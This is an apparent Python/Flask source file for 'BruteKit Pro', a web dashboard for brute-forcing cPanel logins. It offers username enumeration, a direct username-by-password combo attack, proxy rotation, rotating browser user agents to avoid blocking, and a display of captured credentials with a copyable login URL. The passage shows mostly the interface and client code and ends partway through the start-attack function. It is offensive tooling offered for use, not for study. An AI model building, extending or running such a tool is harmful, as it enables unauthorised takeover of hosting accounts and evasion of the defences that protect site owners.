#!/usr/bin/env python3
# BruteKit Pro — Final | Render | Live Monitor | Proxy Rotation | Anti-block

import os, time, threading, uuid, random, requests, urllib3
from flask import Flask, Response, request, render_template_string
from queue import Queue, Empty

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app  = Flask(__name__)
JOBS = {}
BASE = os.path.dirname(os.path.abspath(__file__))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>BruteKit Pro</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#060609;color:#c9d1d9;font-family:'Courier New',monospace;min-height:100vh}
.hdr{background:#0a0a14;border-bottom:1px solid #161630;padding:13px 20px;display:flex;align-items:center;gap:10px}
.hdr h1{color:#58a6ff;font-size:1.15rem;letter-spacing:3px}
.hdr small{color:#30363d;font-size:.68rem}
.badge{background:#1a2a4a;color:#58a6ff;font-size:.58rem;padding:2px 7px;border-radius:7px;border:1px solid #1f3a6e;margin-left:4px}
.lay{display:grid;grid-template-columns:310px 1fr;height:calc(100vh - 50px)}
.sb{background:#0a0a14;border-right:1px solid #161630;padding:14px;overflow-y:auto}
.mn{display:flex;flex-direction:column;padding:12px;gap:9px;overflow:hidden;min-height:0}
.stit{color:#58a6ff;font-size:.62rem;letter-spacing:2px;margin:10px 0 7px;display:flex;align-items:center;gap:5px}
.stit::before{content:'';width:3px;height:9px;background:#58a6ff;border-radius:1px;display:inline-block}
.lbl{color:#8b949e;font-size:.7rem;display:block;margin-bottom:3px;margin-top:7px}
input,select,textarea{width:100%;background:#0d1117;color:#e6edf3;border:1px solid #21262d;border-radius:4px;padding:6px 10px;font-family:inherit;font-size:.8rem;transition:.15s}
input:focus,select:focus,textarea:focus{outline:none;border-color:#58a6ff}
.mb{border:1px solid #21262d;border-radius:4px;padding:9px 11px;margin-bottom:5px;cursor:pointer;transition:.15s;position:relative}
.mb:hover,.mb.act{border-color:#58a6ff;background:#0a1522}
.mb input[type=radio]{position:absolute;opacity:0}
.mb .mt{color:#e6edf3;font-size:.78rem;font-weight:bold;margin-bottom:2px}
.mb .md{color:#6e7681;font-size:.68rem;line-height:1.4}
.mb .chip{font-size:.56rem;padding:1px 6px;border-radius:6px;float:right;margin-top:1px}
.c-g{background:#0d2a1a;color:#3fb950;border:1px solid #1a4a2a}
.c-b{background:#1a2a4a;color:#58a6ff;border:1px solid #1f3a6e}
.c-o{background:#2a1a0d;color:#d29922;border:1px solid #4a2a0d}
.r2{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.btn{width:100%;padding:9px;background:linear-gradient(135deg,#1f4e8c,#0d2a5e);color:#58a6ff;border:1px solid #1f3a6e;border-radius:4px;font-family:inherit;font-size:.86rem;font-weight:bold;cursor:pointer;letter-spacing:1px;margin-top:10px;transition:.2s}
.btn:hover{border-color:#58a6ff}
.btn:disabled{background:#0a0a14;color:#30363d;border-color:#161630;cursor:not-allowed}
.btn-st{background:linear-gradient(135deg,#4e1f1f,#2a0d0d)!important;color:#f85149!important;border-color:#4a1a1a!important;display:none}

/* Stats */
.sbar{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;flex-shrink:0}
.sc{background:#0a0a14;border:1px solid #161630;border-radius:4px;padding:8px 10px}
.sc .v{font-size:1.1rem;font-weight:bold;color:#58a6ff}
.sc .l{font-size:.58rem;color:#6e7681;margin-top:1px;letter-spacing:1px}
.sc.gn .v{color:#3fb950}.sc.yw .v{color:#d29922}.sc.pu .v{color:#a371f7}.sc.cy .v{color:#79c0ff}

/* Progress */
.pgw{background:#0a0a14;border:1px solid #161630;border-radius:4px;padding:9px 12px;flex-shrink:0}
.pgl{display:flex;justify-content:space-between;margin-bottom:5px;font-size:.7rem}
.pgl .a{color:#8b949e}.pgl .b{color:#58a6ff}
.pbg{background:#161630;border-radius:2px;height:4px;overflow:hidden}
.pf{height:100%;background:linear-gradient(90deg,#1f4e8c,#58a6ff);border-radius:2px;transition:width .3s;width:0%}

/* ── LIVE FEED BOX ── */
.live-box{background:#08080f;border:1px solid #1a1a3a;border-radius:5px;flex-shrink:0;overflow:hidden;position:relative}
.live-box::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,#58a6ff,transparent);animation:scan 2.5s linear infinite;pointer-events:none}
@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.live-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;border-bottom:1px solid #111828;background:#0a0a14}
.live-title{color:#58a6ff;font-size:.63rem;letter-spacing:2px;display:flex;align-items:center;gap:6px}
.live-dot{width:7px;height:7px;border-radius:50%;background:#1a1a2a;display:inline-block}
.live-dot.on{background:#3fb950;animation:blink .5s ease-in-out infinite alternate}
@keyframes blink{from{opacity:1}to{opacity:.2}}
.live-counter{font-size:.6rem;color:#30363d;margin-left:auto;padding-right:4px}
.live-feed{height:140px;overflow-y:auto;padding:6px 0;font-size:.72rem;line-height:1.5;font-family:'Courier New',monospace}
.live-feed::-webkit-scrollbar{width:3px}
.live-feed::-webkit-scrollbar-thumb{background:#1a1a2a;border-radius:2px}
.lf-row{display:flex;align-items:center;gap:0;padding:1px 10px;border-bottom:1px solid #0a0a12;transition:background .1s}
.lf-row:hover{background:#0d0d18}
.lf-row.lf-found{background:#091a09!important;border-bottom-color:#1a3a1a}
.lf-row.lf-valid{background:#090d18!important}
.lf-row.lf-err{background:#120909!important}
.lf-time{color:#21262d;font-size:.62rem;min-width:52px;flex-shrink:0}
.lf-combo{color:#8b949e;min-width:0;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lf-combo .u{color:#c9d1d9;font-weight:bold}
.lf-combo .p{color:#6e7681}
.lf-status{min-width:38px;text-align:center;font-size:.65rem;font-weight:bold;flex-shrink:0}
.lf-time-ms{color:#30363d;font-size:.62rem;min-width:48px;text-align:right;flex-shrink:0}
.lf-result{font-size:.65rem;min-width:52px;text-align:right;flex-shrink:0}
.s302{color:#3fb950}.s401{color:#21262d}.s200{color:#d29922}.serr{color:#f85149}
.rf-found{color:#3fb950;font-weight:bold}.rf-fail{color:#21262d}.rf-valid{color:#79c0ff}.rf-err{color:#f85149}

/* Found banner */
.fb{display:none;background:#0a1f0a;border:1px solid #3fb950;border-radius:4px;padding:11px 15px;flex-shrink:0;animation:glow .9s ease-in-out infinite alternate}
.fb .ft{color:#3fb950;font-size:.95rem;font-weight:bold;margin-bottom:5px}
.fb .fc{color:#e6edf3;font-size:.8rem;line-height:1.9}
.fb .fu{color:#58a6ff;font-size:.72rem;word-break:break-all;margin-top:4px;cursor:pointer}
@keyframes glow{from{box-shadow:0 0 5px rgba(63,185,80,.3)}to{box-shadow:0 0 16px rgba(63,185,80,.6)}}

/* Tabs */
.tabs{display:flex;border-bottom:1px solid #161630;flex-shrink:0}
.tab{padding:6px 14px;font-size:.72rem;cursor:pointer;color:#6e7681;border-bottom:2px solid transparent;transition:.15s}
.tab:hover{color:#8b949e}
.tab.act{color:#58a6ff;border-bottom-color:#58a6ff}
.tpane{display:none;flex:1;min-height:0;overflow:hidden;flex-direction:column}
.tpane.act{display:flex}

/* Terminal */
.term{flex:1;overflow-y:auto;padding:10px 12px;font-size:.74rem;line-height:1.6;background:#010409;border:1px solid #161630;border-radius:4px;min-height:0}
.term::-webkit-scrollbar{width:3px}
.term::-webkit-scrollbar-thumb{background:#21262d;border-radius:2px}
.ti{color:#58a6ff}.tok{color:#3fb950}.tf{color:#1e2530}.tw{color:#d29922}
.tfound{color:#3fb950;font-weight:bold;font-size:.82rem}.terr{color:#f85149}
.tmeth{color:#a371f7;font-weight:bold}.tsep{color:#111820}.tval{color:#79c0ff;font-weight:bold}
.trep{color:#e6edf3;background:#0a1a0a;border-left:3px solid #3fb950;padding:3px 8px;margin:2px 0;border-radius:0 3px 3px 0}

/* Table */
.tbl-toolbar{display:flex;gap:7px;padding:7px 0;align-items:center;flex-shrink:0}
.tbl-toolbar input{max-width:200px;padding:4px 8px;font-size:.72rem}
.tbl-toolbar select{max-width:130px;padding:4px 8px;font-size:.72rem}
.cnt{color:#6e7681;font-size:.68rem;margin-left:auto}
.btn-xs{padding:3px 9px;background:#0d1117;color:#8b949e;border:1px solid #21262d;border-radius:3px;cursor:pointer;font-size:.68rem;font-family:inherit}
.btn-xs:hover{border-color:#58a6ff;color:#58a6ff}
.tbl-wrap{flex:1;overflow:auto;min-height:0}
.tbl-wrap::-webkit-scrollbar{width:3px;height:3px}
.tbl-wrap::-webkit-scrollbar-thumb{background:#21262d;border-radius:2px}
table{width:100%;border-collapse:collapse;font-size:.72rem}
thead th{background:#0a0a14;color:#8b949e;padding:6px 9px;text-align:left;position:sticky;top:0;border-bottom:1px solid #161630;cursor:pointer;white-space:nowrap}
thead th:hover{color:#58a6ff}
tbody tr{border-bottom:1px solid #0d1117;transition:.12s}
tbody tr:hover{background:#0d1117}
tbody td{padding:4px 9px;white-space:nowrap}
.rf{background:#0a1f0a!important;color:#3fb950}.rfl{color:#1e2530}.re{color:#3a1a1a}.rv{background:#0a1222!important;color:#79c0ff}
.s3{color:#3fb950;font-weight:bold}.s4{color:#1e2530}.s2{color:#d29922}.se{color:#f85149}

/* Chart */
.chart-area{flex:1;overflow-y:auto;padding:4px 0;min-height:0;display:flex;flex-direction:column;gap:12px}
.chart-area::-webkit-scrollbar{width:3px}
.chart-area::-webkit-scrollbar-thumb{background:#21262d;border-radius:2px}
.ch-box{background:#0a0a14;border:1px solid #161630;border-radius:4px;padding:12px 15px}
.ch-title{color:#8b949e;font-size:.65rem;letter-spacing:1px;margin-bottom:10px}
.sbc .row{display:flex;align-items:center;gap:7px;margin-bottom:6px}
.sbc .lb{width:44px;font-size:.68rem;text-align:right;flex-shrink:0}
.sbc .br{height:14px;border-radius:2px;min-width:2px;transition:width .4s}
.sbc .ct{font-size:.68rem;margin-left:4px;color:#6e7681}
.hmap{overflow-x:auto}
.hmap table{width:auto}
.hmap thead th{font-size:.58rem;padding:3px 5px;max-width:72px;overflow:hidden;text-overflow:ellipsis;background:#060609}
.hmap thead th:first-child{min-width:85px}
.hmap tbody td{padding:3px 4px;text-align:center;font-size:.58rem}
.hmap tbody td:first-child{text-align:left;color:#8b949e;font-size:.65rem;white-space:nowrap}
.hcf{background:#132813;color:#3fb950;border-radius:2px}
.hcx{background:#0d1117;color:#1e2530;border-radius:2px}
.hce{background:#1f0d0d;color:#f85149;border-radius:2px}
.hcp{background:#111828;color:#30363d;border-radius:2px}
.hcs{background:#1a1a0d;color:#d29922;border-radius:2px}
.usr-tbl table{font-size:.7rem}
.usr-tbl tbody td{padding:4px 9px}
</style>
</head>
<body>
<div class="hdr">
  <div><h1>&#9670; BRUTEKIT PRO</h1><small>Render Cloud — Tera IP safe</small></div>
  <span class="badge">FINAL</span>
</div>
<div class="lay">

<!-- SIDEBAR -->
<div class="sb">
  <div class="stit">TARGET</div>
  <label class="lbl">Site URL</label>
  <input type="text" id="url" placeholder="radhewins.buzz" autocomplete="off">
  <label class="lbl">cPanel Port</label>
  <select id="port">
    <option value="2083">2083 — HTTPS (default)</option>
    <option value="2082">2082 — HTTP (agar 2083 band ho)</option>
  </select>

  <div class="stit">MODE</div>
  <label class="mb act" id="mb1"><input type="radio" name="mode" value="1" checked>
    <span class="chip c-g">BEST</span>
    <div class="mt">Enum → Brute</div>
    <div class="md">3 methods se valid usernames pehle dhundho, phir unpe password brute</div>
  </label>
  <label class="mb" id="mb2"><input type="radio" name="mode" value="2">
    <span class="chip c-b">DIRECT</span>
    <div class="mt">Seedha Brute</div>
    <div class="md">username.txt × password.txt sab combos try karo</div>
  </label>
  <label class="mb" id="mb3"><input type="radio" name="mode" value="3">
    <span class="chip c-o">RECON</span>
    <div class="mt">Sirf Username Enum</div>
    <div class="md">3 methods se sirf valid usernames dhundho</div>
  </label>

  <div class="stit">RESET PAGE URL</div>
  <label class="lbl">Custom reset URL (optional)</label>
  <input type="text" id="reset_url" placeholder="https://site.com:2083/resetpass">

  <div class="stit">ANTI-BLOCK</div>
  <label class="lbl">proxies.txt mein proxies daal ke bhi block se bacha sakte ho</label>
  <div style="color:#30363d;font-size:.65rem;line-height:1.5">
    Format: http://ip:port<br>
    Ya: http://user:pass@ip:port<br>
    Render folder mein proxies.txt rakho
  </div>

  <div class="stit">SETTINGS</div>
  <div class="r2">
    <div><label class="lbl">Threads</label><input type="number" id="threads" value="2" min="1" max="8"></div>
    <div><label class="lbl">Delay (sec)</label><input type="number" id="delay" value="0.5" step="0.1" min="0"></div>
  </div>
  <button class="btn" id="btn-go" onclick="startAttack()">&#9654; START</button>
  <button class="btn btn-st" id="btn-xx" onclick="stopAttack()">&#9632; STOP</button>
</div>

<!-- MAIN -->
<div class="mn">
  <!-- Stats -->
  <div class="sbar">
    <div class="sc"><div class="v" id="s-tot">0</div><div class="l">TOTAL</div></div>
    <div class="sc yw"><div class="v" id="s-tri">0</div><div class="l">TRIED</div></div>
    <div class="sc cy"><div class="v" id="s-val">0</div><div class="l">VALID USERS</div></div>
    <div class="sc pu"><div class="v" id="s-spd">0</div><div class="l">REQ/MIN</div></div>
    <div class="sc gn"><div class="v" id="s-fnd">0</div><div class="l">FOUND</div></div>
  </div>
  <!-- Progress -->
  <div class="pgw">
    <div class="pgl"><span class="a" id="pl">Idle</span><span class="b" id="pp">0%</span></div>
    <div class="pbg"><div class="pf" id="pb"></div></div>
  </div>

  <!-- ── LIVE FEED ── -->
  <div class="live-box" id="live-box">
    <div class="live-header">
      <span class="live-title">
        <span class="live-dot" id="live-dot"></span>
        &#9889; LIVE FEED
      </span>
      <span style="display:flex;align-items:center;gap:10px">
        <span id="live-status-txt" style="font-size:.6rem;color:#30363d;letter-spacing:1px">IDLE</span>
        <span class="live-counter" id="live-cnt">0 attempts</span>
      </span>
    </div>
    <div class="live-feed" id="live-feed">
      <div class="lf-row"><span class="lf-time">--:--:--</span><span class="lf-combo" style="color:#21262d">Waiting for attack to start...</span></div>
    </div>
  </div>

  <!-- Found -->
  <div class="fb" id="found-box">
    <div class="ft">&#10003; CREDENTIALS MILGAYE!</div>
    <div class="fc" id="found-c"></div>
    <div class="fu" id="found-u" onclick="copyLogin()"></div>
  </div>

  <!-- Tabs -->
  <div class="tabs">
    <div class="tab act" onclick="showTab('log',this)">&#9654; Live Log</div>
    <div class="tab" onclick="showTab('tbl',this)">&#9776; Attempts Table</div>
    <div class="tab" onclick="showTab('cht',this)">&#9636; Charts</div>
  </div>

  <!-- Log -->
  <div class="tpane act" id="pane-log">
    <div class="term" id="term">
      <div class="ti">[SYSTEM] BruteKit Pro FINAL ready.</div>
      <div class="ti">[SYSTEM] Sidebar mein URL daalo → START karo.</div>
    </div>
  </div>

  <!-- Table -->
  <div class="tpane" id="pane-tbl">
    <div class="tbl-toolbar">
      <input type="text" id="tf" placeholder="Filter username/password/status..." oninput="filterTable()">
      <select id="tr" onchange="filterTable()">
        <option value="">All</option>
        <option value="FOUND">Found</option>
        <option value="FAIL">Fail</option>
        <option value="VALID_USER">Valid Users</option>
        <option value="ERROR">Errors</option>
      </select>
      <button class="btn-xs" onclick="exportCSV()">&#8595; CSV</button>
      <span class="cnt" id="tc">0 rows</span>
    </div>
    <div class="tbl-wrap">
      <table id="atbl">
        <thead><tr>
          <th onclick="sortTable(0)">#</th>
          <th onclick="sortTable(1)">Username</th>
          <th onclick="sortTable(2)">Password</th>
          <th onclick="sortTable(3)">HTTP</th>
          <th onclick="sortTable(4)">Time</th>
          <th onclick="sortTable(5)">Result</th>
          <th>Type</th>
          <th>Proxy</th>
        </tr></thead>
        <tbody id="atbody"></tbody>
      </table>
    </div>
  </div>

  <!-- Charts -->
  <div class="tpane" id="pane-cht">
    <div class="chart-area">
      <div class="ch-box">
        <div class="ch-title">HTTP STATUS DISTRIBUTION</div>
        <div class="sbc" id="sc-chart"><div style="color:#30363d;font-size:.7rem">Attack ke baad update hoga...</div></div>
      </div>
      <div class="ch-box">
        <div class="ch-title">USERNAME × PASSWORD HEATMAP &nbsp;<small style="color:#30363d">green=found · yellow=slow · gray=fail</small></div>
        <div class="hmap" id="hmap"><div style="color:#30363d;font-size:.7rem">Attack ke baad heatmap banega...</div></div>
      </div>
      <div class="ch-box usr-tbl">
        <div class="ch-title">PER USERNAME SUMMARY</div>
        <table id="ust"><thead><tr><th>Username</th><th>Tried</th><th>Found</th><th>Avg Time</th><th>Statuses</th></tr></thead><tbody id="usb"></tbody></table>
      </div>
    </div>
  </div>
</div>
</div>

<script>
let evtSrc=null,startTime=null,stopped=false,sTimer=null;
let tried=0,total=0,validU=0,found=0;
let tableData=[],sortCol=0,sortAsc=true;
let userStats={},statusDist={},hmapData={};
let loginUrl='';

function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function showTab(id,el){
  document.querySelectorAll('.tpane').forEach(p=>p.classList.remove('act'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('act'));
  document.getElementById('pane-'+id).classList.add('act');el.classList.add('act');
  if(id==='cht')updateCharts();
}
function setStat(id,v){document.getElementById(id).textContent=v}
function setProgress(p,l){
  document.getElementById('pb').style.width=Math.min(p,100)+'%';
  document.getElementById('pp').textContent=Math.min(p,100)+'%';
  if(l)document.getElementById('pl').textContent=l;
}
function log(msg,cls){
  const t=document.getElementById('term');
  const d=document.createElement('div');d.className=cls||'';d.textContent=msg;t.appendChild(d);
  t.scrollTop=t.scrollHeight;while(t.children.length>3000)t.removeChild(t.firstChild);
}

// ── Live Feed ─────────────────────────────────────────────────
let liveCnt=0;
function updateLive(user,pass,status,timeMs,result,proxy){
  liveCnt++;
  document.getElementById('live-dot').className='live-dot on';
  document.getElementById('live-status-txt').textContent='ACTIVE';
  document.getElementById('live-status-txt').style.color='#3fb950';
  document.getElementById('live-cnt').textContent=liveCnt+' attempts';

  const feed=document.getElementById('live-feed');
  const now=new Date();
  const ts=now.toTimeString().slice(0,8);

  // Status color class
  const sc=['302','301','303','307'].includes(status)?'s302':
            ['401','403'].includes(status)?'s401':
            status==='200'?'s200':status==='ERR'?'serr':'';

  // Result
  const isFound=result==='FOUND';
  const isValid=result==='VALID_USER';
  const isErr=result==='ERROR';
  const rc=isFound?'rf-found':isValid?'rf-valid':isErr?'rf-err':'rf-fail';
  const ri=isFound?'✓ FOUND':isValid?'~ VALID':isErr?'! ERR':'✗';
  const rowCls='lf-row'+(isFound?' lf-found':isValid?' lf-valid':isErr?' lf-err':'');

  const proxyInfo=proxy&&proxy!=='Direct'?` [${proxy.split(':')[0].slice(-8)}]`:'';
  const timeStr=parseFloat(timeMs)>0?parseFloat(timeMs).toFixed(0)+'ms':'—';

  const row=document.createElement('div');
  row.className=rowCls;
  row.innerHTML=
    `<span class="lf-time">${ts}</span>`+
    `<span class="lf-combo"><span class="u">${esc(user)}</span><span class="p"> : ${esc(pass)}</span>${proxyInfo}</span>`+
    `<span class="lf-status ${sc}">${status}</span>`+
    `<span class="lf-time-ms">${timeStr}</span>`+
    `<span class="lf-result ${rc}">${ri}</span>`;

  feed.appendChild(row);
  // Auto-scroll to bottom
  feed.scrollTop=feed.scrollHeight;
  // Keep max 500 rows
  while(feed.children.length>500) feed.removeChild(feed.firstChild);
}
function idleLive(){
  document.getElementById('live-dot').className='live-dot';
  document.getElementById('live-status-txt').textContent='IDLE';
  document.getElementById('live-status-txt').style.color='#30363d';
  liveCnt=0;
  document.getElementById('live-cnt').textContent='0 attempts';
}

// ── Table ─────────────────────────────────────────────────────
function addRow(n,user,pass,status,timeMs,result,type,proxy){
  tableData.push({n:parseInt(n),user,pass,status,time:parseFloat(timeMs)||0,result,type,proxy:proxy||'Direct'});
  if(!userStats[user])userStats[user]={tried:0,found:0,times:[],statuses:{}};
  userStats[user].tried++;userStats[user].times.push(parseFloat(timeMs)||0);
  userStats[user].statuses[status]=(userStats[user].statuses[status]||0)+1;
  if(result==='FOUND')userStats[user].found++;
  statusDist[status]=(statusDist[status]||0)+1;
  hmapData[user+'|||'+pass]={status,time:parseFloat(timeMs)||0,result};
  renderNewRow(tableData[tableData.length-1]);
  setStat('tc',tableData.length+' rows');
}
function rowCls(r){
  if(r==='FOUND')return 'rf';if(r==='VALID_USER')return 'rv';if(r==='ERROR')return 're';return 'rfl';
}
function sCls(s){
  if(['302','301','303','307'].includes(s))return 's3';if(['401','403'].includes(s))return 's4';
  if(s==='200')return 's2';if(s==='ERR')return 'se';return '';
}
function rIcon(r){
  if(r==='FOUND')return '✓ FOUND';if(r==='VALID_USER')return '~ VALID';if(r==='ERROR')return '! ERR';return '✗';
}
function renderNewRow(row){
  const fi=document.getElementById('tf').value.toLowerCase();
  const ri=document.getElementById('tr').value;
  const str=(row.user+row.pass+row.status+row.result).toLowerCase();
  if(fi&&!str.includes(fi))return;if(ri&&row.result!==ri)return;
  const tb=document.getElementById('atbody');
  const tr=document.createElement('tr');tr.className=rowCls(row.result);
  tr.innerHTML=`<td>${row.n}</td><td>${esc(row.user)}</td><td>${esc(row.pass)}</td>
    <td class="${sCls(row.status)}">${row.status}</td>
    <td>${row.time>0?row.time.toFixed(0)+'ms':'—'}</td>
    <td>${rIcon(row.result)}</td>
    <td style="color:#30363d;font-size:.62rem">${row.type}</td>
    <td style="color:#30363d;font-size:.62rem">${esc(row.proxy)}</td>`;
  tb.appendChild(tr);
}
function filterTable(){
  const fi=document.getElementById('tf').value.toLowerCase();
  const ri=document.getElementById('tr').value;
  document.getElementById('atbody').innerHTML='';
  let shown=0;
  tableData.forEach(r=>{
    const str=(r.user+r.pass+r.status+r.result).toLowerCase();
    if(fi&&!str.includes(fi))return;if(ri&&r.result!==ri)return;
    renderNewRow(r);shown++;
  });
  setStat('tc',shown+'/'+tableData.length+' rows');
}
function sortTable(col){
  if(sortCol===col)sortAsc=!sortAsc;else{sortCol=col;sortAsc=true;}
  const ks=['n','user','pass','status','time','result'];
  tableData.sort((a,b)=>{
    let va=a[ks[col]],vb=b[ks[col]];
    return typeof va==='number'?(sortAsc?va-vb:vb-va):(sortAsc?String(va).localeCompare(String(vb)):String(vb).localeCompare(String(va)));
  });filterTable();
}
function exportCSV(){
  const h='#,Username,Password,HTTP,Time(ms),Result,Type,Proxy\n';
  const rows=tableData.map(r=>`${r.n},"${r.user}","${r.pass}",${r.status},${r.time>0?r.time.toFixed(0):''},${r.result},${r.type},"${r.proxy}"`).join('\n');
  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([h+rows],{type:'text/csv'}));a.download='brutekit_report.csv';a.click();
}
function copyLogin(){
  if(loginUrl){navigator.clipboard.writeText(loginUrl).then(()=>{document.getElementById('found-u').textContent='✓ Copied! '+loginUrl;});}
}

// ── Charts ────────────────────────────────────────────────────
function updateCharts(){
  // Status distribution
  const sc=document.getElementById('sc-chart');
  if(!Object.keys(statusDist).length){sc.innerHTML='<div style="color:#30363d;font-size:.7rem">Data nahi hai abhi...</div>';return;}
  const max=Math.max(...Object.values(statusDist));
  const cols={'302':'#3fb950','301':'#3fb950','303':'#3fb950','307':'#3fb950','401':'#3a4555','403':'#3a4555','200':'#d29922','ERR':'#f85149'};
  sc.innerHTML=Object.entries(statusDist).sort((a,b)=>b[1]-a[1]).map(([code,cnt])=>`
    <div class="row"><div class="lb" style="color:${cols[code]||'#58a6ff'}">${code}</div>
    <div class="br" style="width:${Math.max(4,Math.round(cnt/max*280))}px;background:${cols[code]||'#58a6ff'}"></div>
    <div class="ct">${cnt}&nbsp;(${((cnt/tableData.length)*100).toFixed(1)}%)</div></div>`).join('');
  // Heatmap
  const users=[...new Set(tableData.map(r=>r.user))];
  const passes=[...new Set(tableData.filter(r=>r.type==='BRUTE').map(r=>r.pass))];
  if(passes.length>0){
    const ab=s=>s.length>10?s.slice(0,9)+'…':s;
    let h=`<table><thead><tr><th>User \\ Pass</th>${passes.map(p=>`<th title="${esc(p)}">${esc(ab(p))}</th>`).join('')}</tr></thead><tbody>`;
    users.forEach(u=>{
      h+=`<tr><td>${esc(u)}</td>`;
      passes.forEach(p=>{
        const c=hmapData[u+'|||'+p];
        if(!c){h+=`<td class="hcp">—</td>`;return;}
        let cls='hcx',t='✗';
        if(c.result==='FOUND'){cls='hcf';t='✓';}
        else if(c.result==='ERROR'){cls='hce';t='!';}
        else if(c.time>500){cls='hcs';t='~';}
        h+=`<td class="${cls}" title="${esc(u+':'+p)} | HTTP ${c.status} | ${c.time.toFixed(0)}ms">${t}</td>`;
      });h+='</tr>';
    });h+='</tbody></table>';
    document.getElementById('hmap').innerHTML=h;
  }
  // Per-user summary
  document.getElementById('usb').innerHTML=Object.entries(userStats).map(([u,d])=>{
    const avg=d.times.length?d.times.reduce((a,b)=>a+b,0)/d.times.length:0;
    const ss=Object.entries(d.statuses).map(([s,c])=>`${s}×${c}`).join(' ');
    return `<tr><td style="color:#e6edf3">${esc(u)}</td><td>${d.tried}</td>
      <td>${d.found>0?`<span style="color:#3fb950;font-weight:bold">${d.found}</span>`:'—'}</td>
      <td>${avg>0?avg.toFixed(0)+'ms':'—'}</td><td style="color:#30363d;font-size:.62rem">${ss}</td></tr>`;
  }).join('');
}

// ── Message parser ────────────────────────────────────────────
let rowN=0;
function parseMsg(raw){
  if(raw.startsWith('STAT:')){
    raw.slice(5).split('|').forEach(p=>{
      const [k,v]=p.split('=');
      if(k==='total'){total=parseInt(v);setStat('s-tot',v);}
      if(k==='tried'){tried=parseInt(v);setStat('s-tri',v);if(total>0)setProgress(Math.min(99,Math.floor(tried/total*100)),`${tried}/${total}`);}
      if(k==='valid'){validU=parseInt(v);setStat('s-val',v);}
      if(k==='found'){found=parseInt(v);setStat('s-fnd',v);}
    });return null;
  }
  if(raw.startsWith('ROW:')){
    const p=raw.slice(4).split('|||');
    if(p.length>=6){addRow(p[0],p[1],p[2],p[3],p[4],p[5],p[6]||'BRUTE',p[7]||'Direct');}
    return null;
  }
  if(raw.startsWith('LIVE:')){
    const p=raw.slice(5).split('|||');
    if(p.length>=5)updateLive(p[0],p[1],p[2],p[3],p[4],p[5]||'Direct');
    return null;
  }
  if(raw.startsWith('FOUND_CRED:')){
    const[u,p,link]=raw.slice(11).split('|||');
    loginUrl=link;
    document.getElementById('found-box').style.display='block';
    document.getElementById('found-c').innerHTML=`<b>Username:</b> ${esc(u)}<br><b>Password:</b> ${esc(p)}`;
    document.getElementById('found-u').textContent='Login URL (tap to copy): '+link;
    found++;setStat('s-fnd',found);return null;
  }
  let cls='tf';
  if(raw.includes('[FOUND]'))cls='tfound';
  else if(raw.startsWith('[+]'))cls='tok';
  else if(raw.startsWith('[*]'))cls='ti';
  else if(raw.startsWith('[!]'))cls='tw';
  else if(raw.startsWith('[x]'))cls='terr';
  else if(raw.startsWith('[METHOD]'))cls='tmeth';
  else if(raw.startsWith('[VALID]'))cls='tval';
  else if(raw.startsWith('[REPORT]'))cls='trep';
  else if(raw.startsWith('='))cls='tsep';
  return{msg:raw,cls};
}

function startAttack(){
  const url=document.getElementById('url').value.trim();
  const port=document.getElementById('port').value;
  const mode=document.querySelector('input[name=mode]:checked').value;
  const threads=document.getElementById('threads').value;
  const delay=document.getElementById('delay').value;
  const reset_url=document.getElementById('reset_url').value.trim();
  if(!url){log('[ERROR] URL daalo pehle!','terr');return;}
  stopped=false;if(evtSrc){evtSrc.close();}
  document.getElementById('term').innerHTML='';
  document.getElementById('atbody').innerHTML='';
